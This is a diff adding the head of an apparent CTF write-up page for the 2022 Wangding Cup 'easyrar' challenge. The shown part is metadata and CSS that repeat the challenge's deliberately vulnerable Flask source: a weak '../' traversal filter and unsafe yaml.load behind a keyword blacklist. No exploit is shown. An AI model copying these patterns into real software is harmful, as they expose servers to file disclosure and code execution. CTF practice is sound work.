@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.134.0">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Snakinya" />
+  <meta property="og:url" content="https://www.snakin.top/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF/" />
+  <link rel="canonical" href="https://www.snakin.top/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF/" /><link rel="apple-touch-icon" href="https://www.snakin.top/favicon.ico" />
+  <link rel="icon" href="https://www.snakin.top/favicon.ico" />
+  <link rel="shortcut" href="https://www.snakin.top/favicon.ico" /><link rel="alternate" type="application/atom+xml" href="https://www.snakin.top/index.xml" title="Snakinya-明烛天南">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "https:\/\/www.snakin.top\/"
+      },
+      "articleSection" : "posts",
+      "name" : "CTF | 2022网鼎杯青龙组\teasyrar",
+      "headline" : "CTF | 2022网鼎杯青龙组\teasyrar",
+      "description" : "easyrar import os import re import yaml import time import socket import subprocess from hashlib import md5 from flask import Flask, render_template, make_response, send_file, request, redirect, session app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = socket.gethostname() def response(content, status): resp = make_response(content, status) return resp @app.before_request def is_login(): if request.path == \u0026#34;\/upload\u0026#34;: if session.get(\u0026#39;user\u0026#39;) != \u0026#34;Administrator\u0026#34;: return f\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Access Denied\u0026#39;);window.location.href=\u0026#39;\/\u0026#39;\u0026lt;\/script\u0026gt;\u0026#34; else: return None @app.route(\u0026#39;\/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def main(): if not session.get(\u0026#39;user\u0026#39;): session[\u0026#39;user\u0026#39;] = \u0026#39;Guest\u0026#39; try: return render_template(\u0026#39;index.html\u0026#39;) except: return response(\u0026#34;Not Found.\u0026#34;, 404) finally: try: updir = \u0026#39;static\/uploads\/\u0026#39; \u002b md5(request.remote_addr.encode()).hexdigest() if not session.get(\u0026#39;updir\u0026#39;): session[\u0026#39;updir\u0026#39;] = updir if not os.path.exists(updir): os.makedirs(updir) except: return response(\u0026#39;Internal Server Error.\u0026#39;, 500) @app.route(\u0026#39;\/\u0026lt;path:file\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def download(file): if session.get(\u0026#39;updir\u0026#39;): basedir = session.get(\u0026#39;updir\u0026#39;) try: path = os.path.join(basedir, file).replace(\u0026#39;..\/\u0026#39;, \u0026#39;\u0026#39;) if os.path.isfile(path): return send_file(path) else: return response(\u0026#34;Not Found.\u0026#34;, 404) except: return response(\u0026#34;Failed.\u0026#34;, 500) @app.route(\u0026#39;\/upload\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def upload(): if request.method == \u0026#39;GET\u0026#39;: return redirect(\u0026#39;\/\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: uploadFile = request.files[\u0026#39;file\u0026#39;] filename = request.files[\u0026#39;file\u0026#39;].filename if re.search(r\u0026#34;\\.\\.|\/\u0026#34;, filename, re.M|re.I) != None: return \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Hacker!\u0026#39;);window.location.href=\u0026#39;\/upload\u0026#39;\u0026lt;\/script\u0026gt;\u0026#34; filepath = f\u0026#34;{session.get(\u0026#39;updir\u0026#39;)}\/{md5(filename.encode()).hexdigest()}.rar\u0026#34; if os.path.exists(filepath): return f\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;The {filename} file has been uploaded\u0026#39;);window.location.href=\u0026#39;\/display?file={filename}\u0026#39;\u0026lt;\/script\u0026gt;\u0026#34; else: uploadFile.save(filepath) extractdir = f\u0026#34;{session.get(\u0026#39;updir\u0026#39;)}\/{filename.split(\u0026#39;.\u0026#39;)[0]}\u0026#34; if not os.path.exists(extractdir): os.makedirs(extractdir) pStatus = subprocess.Popen([\u0026#34;\/usr\/bin\/unrar\u0026#34;, \u0026#34;x\u0026#34;, \u0026#34;-o\u002b\u0026#34;, filepath, extractdir]) t_beginning = time.time() seconds_passed = 0 timeout=60 while True: if pStatus.poll() is not None: break seconds_passed = time.time() - t_beginning if timeout and seconds_passed \u0026gt; timeout: pStatus.terminate() raise TimeoutError(cmd, timeout) time.sleep(0.1) rarDatas = {\u0026#39;filename\u0026#39;: filename, \u0026#39;dirs\u0026#39;: [], \u0026#39;files\u0026#39;: []} for dirpath, dirnames, filenames in os.walk(extractdir): relative_dirpath = dirpath.split(extractdir)[-1] rarDatas[\u0026#39;dirs\u0026#39;].append(relative_dirpath) for file in filenames: rarDatas[\u0026#39;files\u0026#39;].append(os.path.join(relative_dirpath, file).split(\u0026#39;.\/\u0026#39;)[-1]) with open(f\u0026#39;fileinfo\/{md5(filename.encode()).hexdigest()}.yaml\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(yaml.dump(rarDatas)) return redirect(f\u0026#39;\/display?file={filename}\u0026#39;) @app.route(\u0026#39;\/display\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def display(): filename = request.args.get(\u0026#39;file\u0026#39;) if not filename: return response(\u0026#34;Not Found.\u0026#34;, 404) if os.path.exists(f\u0026#39;fileinfo\/{md5(filename.encode()).hexdigest()}.yaml\u0026#39;): with open(f\u0026#39;fileinfo\/{md5(filename.encode()).hexdigest()}.yaml\u0026#39;, \u0026#39;r\u0026#39;) as f: yamlDatas = f.read() if not re.search(r\u0026#34;apply|process|out|system|exec|tuple|flag|\\(|\\)|\\{|\\}\u0026#34;, yamlDatas, re.M|re.I): rarDatas = yaml.load(yamlDatas.strip().strip(b\u0026#39;\\x00\u0026#39;.decode())) if rarDatas: return render_template(\u0026#39;result.html\u0026#39;, filename=filename, path=filename.split(\u0026#39;.\u0026#39;)[0], files=rarDatas[\u0026#39;files\u0026#39;]) else: return response(\u0026#39;Internal Server Error.\u0026#39;, 500) else: return response(\u0026#39;Forbidden.\u0026#39;, 403) else: return response(\u0026#34;Not Found.\u0026#34;, 404) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8888) ",
+      "inLanguage" : "en-US",
+      "author" : "Snakinya",
+      "creator" : "Snakinya",
+      "publisher": "Snakinya",
+      "accountablePerson" : "Snakinya",
+      "copyrightHolder" : "Snakinya",
+      "copyrightYear" : "2022",
+      "datePublished": "2022-09-09 00:00:00 \u002b0000 UTC",
+      "dateModified" : "2022-09-09 00:00:00 \u002b0000 UTC",
+      "url" : "https:\/\/www.snakin.top\/posts\/2022%E7%BD%91%E9%BC%8E%E6%9D%AF\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>CTF | 2022网鼎杯青龙组	easyrar</title>
+  <meta property="og:title" content="CTF | 2022网鼎杯青龙组	easyrar" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="easyrar import os import re import yaml import time import socket import subprocess from hashlib import md5 from flask import Flask, render_template, make_response, send_file, request, redirect, session app = Flask(__name__) app.config[&#39;SECRET_KEY&#39;] = socket.gethostname() def response(content, status): resp = make_response(content, status) return resp @app.before_request def is_login(): if request.path == &#34;/upload&#34;: if session.get(&#39;user&#39;) != &#34;Administrator&#34;: return f&#34;&lt;script&gt;alert(&#39;Access Denied&#39;);window.location.href=&#39;/&#39;&lt;/script&gt;&#34; else: return None @app.route(&#39;/&#39;, methods=[&#39;GET&#39;]) def main(): if not session.get(&#39;user&#39;): session[&#39;user&#39;] = &#39;Guest&#39; try: return render_template(&#39;index.html&#39;) except: return response(&#34;Not Found.&#34;, 404) finally: try: updir = &#39;static/uploads/&#39; &#43; md5(request.remote_addr.encode()).hexdigest() if not session.get(&#39;updir&#39;): session[&#39;updir&#39;] = updir if not os.path.exists(updir): os.makedirs(updir) except: return response(&#39;Internal Server Error.&#39;, 500) @app.route(&#39;/&lt;path:file&gt;&#39;, methods=[&#39;GET&#39;]) def download(file): if session.get(&#39;updir&#39;): basedir = session.get(&#39;updir&#39;) try: path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) if os.path.isfile(path): return send_file(path) else: return response(&#34;Not Found.&#34;, 404) except: return response(&#34;Failed.&#34;, 500) @app.route(&#39;/upload&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def upload(): if request.method == &#39;GET&#39;: return redirect(&#39;/&#39;) if request.method == &#39;POST&#39;: uploadFile = request.files[&#39;file&#39;] filename = request.files[&#39;file&#39;].filename if re.search(r&#34;\.\.|/&#34;, filename, re.M|re.I) != None: return &#34;&lt;script&gt;alert(&#39;Hacker!&#39;);window.location.href=&#39;/upload&#39;&lt;/script&gt;&#34; filepath = f&#34;{session.get(&#39;updir&#39;)}/{md5(filename.encode()).hexdigest()}.rar&#34; if os.path.exists(filepath): return f&#34;&lt;script&gt;alert(&#39;The {filename} file has been uploaded&#39;);window.location.href=&#39;/display?file={filename}&#39;&lt;/script&gt;&#34; else: uploadFile.save(filepath) extractdir = f&#34;{session.get(&#39;updir&#39;)}/{filename.split(&#39;.&#39;)[0]}&#34; if not os.path.exists(extractdir): os.makedirs(extractdir) pStatus = subprocess.Popen([&#34;/usr/bin/unrar&#34;, &#34;x&#34;, &#34;-o&#43;&#34;, filepath, extractdir]) t_beginning = time.time() seconds_passed = 0 timeout=60 while True: if pStatus.poll() is not None: break seconds_passed = time.time() - t_beginning if timeout and seconds_passed &gt; timeout: pStatus.terminate() raise TimeoutError(cmd, timeout) time.sleep(0.1) rarDatas = {&#39;filename&#39;: filename, &#39;dirs&#39;: [], &#39;files&#39;: []} for dirpath, dirnames, filenames in os.walk(extractdir): relative_dirpath = dirpath.split(extractdir)[-1] rarDatas[&#39;dirs&#39;].append(relative_dirpath) for file in filenames: rarDatas[&#39;files&#39;].append(os.path.join(relative_dirpath, file).split(&#39;./&#39;)[-1]) with open(f&#39;fileinfo/{md5(filename.encode()).hexdigest()}.yaml&#39;, &#39;w&#39;) as f: f.write(yaml.dump(rarDatas)) return redirect(f&#39;/display?file={filename}&#39;) @app.route(&#39;/display&#39;, methods=[&#39;GET&#39;]) def display(): filename = request.args.get(&#39;file&#39;) if not filename: return response(&#34;Not Found.&#34;, 404) if os.path.exists(f&#39;fileinfo/{md5(filename.encode()).hexdigest()}.yaml&#39;): with open(f&#39;fileinfo/{md5(filename.encode()).hexdigest()}.yaml&#39;, &#39;r&#39;) as f: yamlDatas = f.read() if not re.search(r&#34;apply|process|out|system|exec|tuple|flag|\(|\)|\{|\}&#34;, yamlDatas, re.M|re.I): rarDatas = yaml.load(yamlDatas.strip().strip(b&#39;\x00&#39;.decode())) if rarDatas: return render_template(&#39;result.html&#39;, filename=filename, path=filename.split(&#39;.&#39;)[0], files=rarDatas[&#39;files&#39;]) else: return response(&#39;Internal Server Error.&#39;, 500) else: return response(&#39;Forbidden.&#39;, 403) else: return response(&#34;Not Found.&#34;, 404) if __name__ == &#39;__main__&#39;: app.run(host=&#39;0.0.0.0&#39;, port=8888) " />
+  <meta name="description" content="easyrar import os import re import yaml import time import socket import subprocess from hashlib import md5 from flask import Flask, render_template, make_response, send_file, request, redirect, session app = Flask(__name__) app.config[&#39;SECRET_KEY&#39;] = socket.gethostname() def response(content, status): resp = make_response(content, status) return resp @app.before_request def is_login(): if request.path == &#34;/upload&#34;: if session.get(&#39;user&#39;) != &#34;Administrator&#34;: return f&#34;&lt;script&gt;alert(&#39;Access Denied&#39;);window.location.href=&#39;/&#39;&lt;/script&gt;&#34; else: return None @app.route(&#39;/&#39;, methods=[&#39;GET&#39;]) def main(): if not session.get(&#39;user&#39;): session[&#39;user&#39;] = &#39;Guest&#39; try: return render_template(&#39;index.html&#39;) except: return response(&#34;Not Found.&#34;, 404) finally: try: updir = &#39;static/uploads/&#39; &#43; md5(request.remote_addr.encode()).hexdigest() if not session.get(&#39;updir&#39;): session[&#39;updir&#39;] = updir if not os.path.exists(updir): os.makedirs(updir) except: return response(&#39;Internal Server Error.&#39;, 500) @app.route(&#39;/&lt;path:file&gt;&#39;, methods=[&#39;GET&#39;]) def download(file): if session.get(&#39;updir&#39;): basedir = session.get(&#39;updir&#39;) try: path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) if os.path.isfile(path): return send_file(path) else: return response(&#34;Not Found.&#34;, 404) except: return response(&#34;Failed.&#34;, 500) @app.route(&#39;/upload&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def upload(): if request.method == &#39;GET&#39;: return redirect(&#39;/&#39;) if request.method == &#39;POST&#39;: uploadFile = request.files[&#39;file&#39;] filename = request.files[&#39;file&#39;].filename if re.search(r&#34;\.\.|/&#34;, filename, re.M|re.I) != None: return &#34;&lt;script&gt;alert(&#39;Hacker!&#39;);window.location.href=&#39;/upload&#39;&lt;/script&gt;&#34; filepath = f&#34;{session.get(&#39;updir&#39;)}/{md5(filename.encode()).hexdigest()}.rar&#34; if os.path.exists(filepath): return f&#34;&lt;script&gt;alert(&#39;The {filename} file has been uploaded&#39;);window.location.href=&#39;/display?file={filename}&#39;&lt;/script&gt;&#34; else: uploadFile.save(filepath) extractdir = f&#34;{session.get(&#39;updir&#39;)}/{filename.split(&#39;.&#39;)[0]}&#34; if not os.path.exists(extractdir): os.makedirs(extractdir) pStatus = subprocess.Popen([&#34;/usr/bin/unrar&#34;, &#34;x&#34;, &#34;-o&#43;&#34;, filepath, extractdir]) t_beginning = time.time() seconds_passed = 0 timeout=60 while True: if pStatus.poll() is not None: break seconds_passed = time.time() - t_beginning if timeout and seconds_passed &gt; timeout: pStatus.terminate() raise TimeoutError(cmd, timeout) time.sleep(0.1) rarDatas = {&#39;filename&#39;: filename, &#39;dirs&#39;: [], &#39;files&#39;: []} for dirpath, dirnames, filenames in os.walk(extractdir): relative_dirpath = dirpath.split(extractdir)[-1] rarDatas[&#39;dirs&#39;].append(relative_dirpath) for file in filenames: rarDatas[&#39;files&#39;].append(os.path.join(relative_dirpath, file).split(&#39;./&#39;)[-1]) with open(f&#39;fileinfo/{md5(filename.encode()).hexdigest()}.yaml&#39;, &#39;w&#39;) as f: f.write(yaml.dump(rarDatas)) return redirect(f&#39;/display?file={filename}&#39;) @app.route(&#39;/display&#39;, methods=[&#39;GET&#39;]) def display(): filename = request.args.get(&#39;file&#39;) if not filename: return response(&#34;Not Found.&#34;, 404) if os.path.exists(f&#39;fileinfo/{md5(filename.encode()).hexdigest()}.yaml&#39;): with open(f&#39;fileinfo/{md5(filename.encode()).hexdigest()}.yaml&#39;, &#39;r&#39;) as f: yamlDatas = f.read() if not re.search(r&#34;apply|process|out|system|exec|tuple|flag|\(|\)|\{|\}&#34;, yamlDatas, re.M|re.I): rarDatas = yaml.load(yamlDatas.strip().strip(b&#39;\x00&#39;.decode())) if rarDatas: return render_template(&#39;result.html&#39;, filename=filename, path=filename.split(&#39;.&#39;)[0], files=rarDatas[&#39;files&#39;]) else: return response(&#39;Internal Server Error.&#39;, 500) else: return response(&#39;Forbidden.&#39;, 403) else: return response(&#34;Not Found.&#34;, 404) if __name__ == &#39;__main__&#39;: app.run(host=&#39;0.0.0.0&#39;, port=8888) " />
+  <meta property="og:locale" content="cn" /><meta property="og:image" content="https://www.snakin.top/favicon.ico" />
+  
+
+  
+    <style>.highlight{position:relative}.clipboard-button{color:var(--white);background-color:rgba(255,255,255,.786);border:none;border-radius:6px;padding:3px 5px 2px;font-size:1rem;position:absolute;z-index:1;right:0;top:0;margin:10px;transition:.1s;opacity:.5}.clipboard-button>svg{fill:var(--white)}.clipboard-button:hover,.clipboard-button:focus,pre:active~.clipboard-button,pre:focus~.clipboard-button,div.highlight:active>.clipboard-button,div.highlight:focus>.clipboard-button{cursor:pointer;opacity:1}</style>
+  
+  
+    <style>@import "https://cdnjs.cloudflare.com/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/lxgwwenkaiscreenr.css";.busuanzi-footer{font-size:14px;color:#666;display:inline-block;gap:10px;align-items:center}.busuanzi-footer .separator{margin:0 5px;color:#999}.footer-beian{font-size:12px;color:#999;margin-top:5px;text-align:center}.footer-beian a{color:#0073e6;text-decoration:none}.footer-beian a:hover{text-decoration:underline}body{font-family:lxgw wenkai screen r,bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:40%;min-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none;word-break:break-all}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:1px;font-size:16px;font-weight:550;font-family:Consolas,Monaco,Menlo,Consolas,monospace;word-break:break-all;word-wrap:break-word;overflow-y:auto;max-height:300px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px;text-size-adjust:100%;-ms-text-size-adjust:100%;-moz-text-size-adjust:100%;-webkit-text-size-adjust:100%}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:150%}.site-date-catalog{font-size:2rem}.header-title{font-size:1.5rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px;font-weight:700}.header-item a:hover{font-weight:700;color:#8a2be2}.header-item a:visited{font-weight:700}.header-item a:active{font-weight:700}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px;text-align:center}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){article{max-width:100%;min-width:300px}.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}table{width:100%;color:#333;border-width:1px;border-color:#666;border-collapse:collapse}table th{border-width:1px;padding:8px;border-style:solid;border-color:#666;background-color:#dedede}table td{border-width:1px;padding:8px;border-style:solid;border-color:#666;background-color:#fff}.post-content a{color:#0969da;box-shadow:none;text-decoration:none}a:hover{font-weight:400}.post-content a:hover{text-decoration:underline}.footnotes{> hr { display: none; }}.footnotes ol{line-height:1.4;margin-bottom:20px}.footnotes li{margin-bottom:5px}.footnotes ol li p{margin:0;padding:0;line-height:1.4}.donation{display:block;margin-left:auto;margin-right:auto}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pa